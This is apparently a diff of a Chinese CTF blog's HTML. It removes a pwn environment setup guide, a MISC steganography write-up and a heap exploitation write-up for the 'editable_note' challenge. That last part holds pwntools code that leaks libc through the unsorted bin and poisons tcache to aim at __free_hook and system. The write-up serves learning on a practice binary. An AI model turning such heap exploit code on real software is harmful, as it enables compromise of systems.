-<h4 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc -y</span><br></pre></td></tr></table></figure>
+        
 
 
-
-<h4 id="git"><a href="#git" class="headerlink" title="git"></a>git</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git -y</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="python3-pip"><a href="#python3-pip" class="headerlink" title="python3-pip"></a>python3-pip</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip -y</span><br><span class="line">sudo mv /usr/lib/python3.12/EXTERNALLY-MANAGED /usr/lib/python3.12/EXTERNALLY-MANAGED.bk</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="pwngdb-pwndbg-敲黑板-调试利器"><a href="#pwngdb-pwndbg-敲黑板-调试利器" class="headerlink" title="pwngdb+pwndbg(敲黑板 调试利器)"></a>pwngdb+pwndbg(敲黑板 调试利器)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd ~/pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line">cd ..</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">vim ~/.gdbinit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209233311428.png" alt="image-20251209233311428">;</p>
-<p>如上这里可能出现<code>unable to access</code>的情况</p>
-<p>git服务器在国外，所以有时候git clone指令会出现这种情况</p>
-<p>一种解决方法是用<code>gitclone.com</code>加速 ，</p>
-<p>git clone <a target="_blank" rel="noopener" href="https://gitclone.com/github.com/pwndbg/pwndbg">https://gitclone.com/github.com/pwndbg/pwndbg</a></p>
-<p>也可以科学上网 </p>
-<p>​	</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210025700005.png" alt="image-20251210025700005"></p>
-<p>点击i 进入编辑模式</p>
-<p>把第一行改为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>按esc    : wq 保存并退出。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210031110253.png" alt="image-20251210031110253"></p>
-<p>可以看到我们的pwngdb和pwndbg已经安好了</p>
-<p>后面已经无脑粘贴</p>
-<h4 id="pwntool（脚本利器）"><a href="#pwntool（脚本利器）" class="headerlink" title="pwntool（脚本利器）"></a>pwntool（脚本利器）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 确保你有 pip</span><br><span class="line">sudo apt install python3-pip python3-dev libssl-dev libffi-dev build-essential</span><br><span class="line"># 安装 pwntools</span><br><span class="line">pip install pwntools --break-system-packages</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/lieanu/LibcSearcher</span><br><span class="line">cd LibcSearcher</span><br><span class="line">sudo python3 setup.py develop</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="one-gadget，seccomp-tools"><a href="#one-gadget，seccomp-tools" class="headerlink" title="one_gadget，seccomp-tools"></a>one_gadget，seccomp-tools</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gem sources --remove https://rubygems.org/  </span><br><span class="line">sudo gem sources --add https://gems.ruby-china.com/</span><br><span class="line">sudo -E gem install seccomp-tools one_gadget</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="ropgadget"><a href="#ropgadget" class="headerlink" title="ropgadget"></a>ropgadget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install ROPgadget --break-system-packages</span><br></pre></td></tr></table></figure>
-
-<h3 id="展示："><a href="#展示：" class="headerlink" title="展示："></a>展示：</h3><p>这里可以随便找一个pwn附件试一下</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210111348903.png" alt="image-20251210111348903"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210111430170.png" alt="image-20251210111430170"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210120524251.png" alt="image-20251210120524251"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210120651912.png" alt="image-20251210120651912"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251210120730435.png" alt="image-20251210120730435"></p>
-<h3 id="食用"><a href="#食用" class="headerlink" title="食用:"></a>食用:</h3><p>常用的工具大概就是这些.记得还要下idapro</p>
-<p>如果你还想美化你的页面的话可以继续搭下去（这是我参考的博客）：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/139352067">★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客</a></p>
-<p>pwn最重要的也是最有魅力的地方大概就是动态和静态调试了 入门的时候可以多调调程序分析分析静态代码。</p>
-<p>pwndbg的基本使用:</p>
-<p><a target="_blank" rel="noopener" href="https://xidp0.github.io/2024/06/13/Pwndbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/">Pwndbg基础使用 | XiDP</a></p>
-<p>也可以看看这个up 大体了解一下Pwn题的解题流程</p>
-<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/500741588?spm_id_from=333.1387.follow.user_card.click">小猿的日常生活的个人空间-小猿的日常生活个人主页-哔哩哔哩视频</a></p>
-<p>虚拟机的搭建到这里就结束了，有问题可以先尝试自行解决，问ai老师或者查询相关博客。当然也联系学长噢。</p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/12/10/pwn%E7%8E%AF%E5%A2%83%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
   
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/09/%E5%B8%82%E8%B5%9Bmisc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/12/09/%E5%B8%82%E8%B5%9Bmisc/" class="post-title-link" itemprop="url">MISCTF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-12-09 01:39:32 / 修改时间：02:18:44" itemprop="dateCreated datePublished" datetime="2025-12-09T01:39:32+08:00">2025-12-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>367</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="MISCTF"><a href="#MISCTF" class="headerlink" title="MISCTF"></a>MISCTF</h1><h2 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251207233225824.png" alt="image-20251207233225824"></p>
-<p>7A改为74</p>
-<p>导出新压缩包</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251207233532258.png" alt="image-20251207233532258"></p>
-<p>丢到随波逐流里 看到是gif</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251207235606080.png" alt="image-20251207235606080"></p>
-<p>gif动态分解帧</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251207235942314.png" alt="image-20251207235942314"></p>
-<p>用stegsolve把两个导出</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209013958715.png" alt="image-20251209013958715"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208002334613.png" alt="image-20251208002334613"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208002344858.png" alt="image-20251208002344858"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208002425714.png" alt="image-20251208002425714"></p>
-<p>拼接起来可以获得flag.</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209013918810.png" alt="image-20251209013918810"></p>
-<h2 id="数据包⾥有神马"><a href="#数据包⾥有神马" class="headerlink" title="数据包⾥有神马"></a>数据包⾥有神马</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208005729366.png" alt="image-20251208005729366"></p>
-<p>发现fenxi.php</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208005918462.png" alt="image-20251208005918462"></p>
-<p>追踪流发现jpeg文件</p>
-<p>转化为图片</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208010409696.png" alt="image-20251208010409696"></p>
-<h2 id="环环相扣"><a href="#环环相扣" class="headerlink" title="环环相扣"></a>环环相扣</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208011041963.png" alt="image-20251208011041963"></p>
-<p>导出表情包</p>
-<p><img src="https://img2020.cnblogs.com/blog/1049983/202108/1049983-20210806171815828-373165372.jpg" alt="img"></p>
-<p>这里没有扫出东西来</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208013132048.png" alt="image-20251208013132048"></p>
-<p>但是这个ctf可能是密码。</p>
-<p>加密668b13e0b0fc0944daf4c223b9831e49。</p>
-<p>然后一个一个binwalk</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208013743833.png" alt="image-20251208013743833"></p>
-<p>可以看到这里有一个ZIP文件</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208014444233.png" alt="image-20251208014444233"></p>
-<p>解码</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208014607551.png" alt="image-20251208014607551"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/seclover.php%253ffile=70bf85eda6b86ee92a5f437f7d83b7e5(1).jpg" alt="seclover.php%3ffile&#x3D;70bf85eda6b86ee92a5f437f7d83b7e5(1)"></p>
-<p>推测和这个图有关系 因为这个是内裤。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208014925325.png" alt="image-20251208014925325"></p>
-<p>得到一个压缩包</p>
-<p>尝试刚刚的密码</p>
-<p><img src="D:\市赛\image-20251208015021085.png" alt="image-20251208015021085"></p>
-<p>成功打开。</p>
-<p>解码获取flag。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251209014601606.png" alt="image-20251209014601606"></p>
-<h2 id="一枝独秀"><a href="#一枝独秀" class="headerlink" title="一枝独秀"></a>一枝独秀</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208022142763.png" alt="image-20251208022142763"></p>
-<p>丢到随波逐流里</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208022825156.png" alt="image-20251208022825156"></p>
-<p>可以看到需要密码</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208024208111.png" alt="image-20251208024208111"></p>
-<p>暴力破解得到密码。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208024325200.png" alt="image-20251208024325200"></p>
-<p>解出来一堆照片。</p>
-<p>按大小排序发现这个（81）和其他的不一样。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208025340599.png" alt="image-20251208025340599"></p>
-<p>密码尝试flowers</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208030136945.png" alt="image-20251208030136945"></p>
-<p>提取出来的文件放到随波逐流可以看出来是zip。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208030340645.png" alt="image-20251208030340645"></p>
-<p>解压得到一个.txt</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208030423857.png" alt="image-20251208030423857"></p>
-<p>丢到随波逐流里</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208031201273.png" alt="image-20251208031201273"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208031252209.png" alt="image-20251208031252209"></p>
-<p>这里看到HINT</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251208031118745.png" alt="image-20251208031118745"></p>
-<p>得到flag.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/03/editable_note/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/12/03/editable_note/" class="post-title-link" itemprop="url">editable_note</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-12-03 22:30:32" itemprop="dateCreated datePublished" datetime="2025-12-03T22:30:32+08:00">2025-12-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-05 01:16:49" itemprop="dateModified" datetime="2025-12-05T01:16:49+08:00">2025-12-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.5k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h1><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210748426.png" alt="image-20251203210748426"></p>
-<p>艾我也喜欢攻破靶机的感觉。</p>
-<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210953023.png"></p>
-<h3 id="add"><a href="#add" class="headerlink" title="add:"></a>add:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211025974.png" alt="image-20251203211025974"></p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211056868.png" alt="image-20251203211056868"></p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211153251.png" alt="image-20251203211153251"></p>
-<h3 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211227251.png" alt="image-20251203211227251"></p>
-<p><strong>这个题是典型的<code>uaf </code>+ <code>tache posioning</code></strong></p>
-<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc:"></a>泄露<code>libc</code>:</h3><p>通过<code>unsorted bin</code>泄露<code>main_arena</code>进而泄露<code>Libc</code></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.anna.nssctf.cn&quot;,25397)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;main_arena: <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">libcbase = main_arena - <span class="number">0x1ecbe0</span></span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(libcbase)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里先申请8个同样大小的chunk 七个用来填满<code>tache bin</code>  另一个用来释放进入<code>unsorted bin </code> </p>
-<p>可以看到<code>chunk7</code> 的fd和bk都指向<code>main_arena</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203212520431.png" alt="image-20251203212520431"></p>
-<h4 id="🐖："><a href="#🐖：" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br></pre></td></tr></table></figure>
-
-<p> 最开始做的时候没有加这个</p>
-<p>导致这个chunk 释放后会和top chunk合并 而不是进入unsorted bin::</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#add(8,0x20)</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213410982.png" alt="image-20251203213410982"></p>
-<p>可以看到没有进入ub 且top chunk的地址发生了变化。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213429481.png" alt="image-20251203213429481"></p>
-<h4 id="🐖：-1"><a href="#🐖：-1" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">###try</span></span><br></pre></td></tr></table></figure>
-
-<p>这里好奇尝试了一下释放这个chunk8 但是他没有和top chunk合并。因为进入<code>tache </code>的优先级高于top chunk 合并</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213842185.png" alt="image-20251203213842185"></p>
-<h3 id="uaf-posioning"><a href="#uaf-posioning" class="headerlink" title="uaf + posioning:"></a>uaf + <code>posioning</code>:</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)  /// </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>) ///</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>有点像double free</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221329698.png" alt="image-20251203221329698"></p>
-<p>这里的<code>0x690</code>是chunk9 <code>0x720</code>是chunk8</p>
-<p><code>tache</code>是 LIFO（后进先出）</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222111156.png" alt="image-20251203222111156"></p>
-<p>chunk9相当于头指针 chunk8是尾指针</p>
-<p>这里修改<code>chunk9</code>的next指针就可以劫持<code>tahce</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221237988.png" alt="image-20251203221237988"></p>
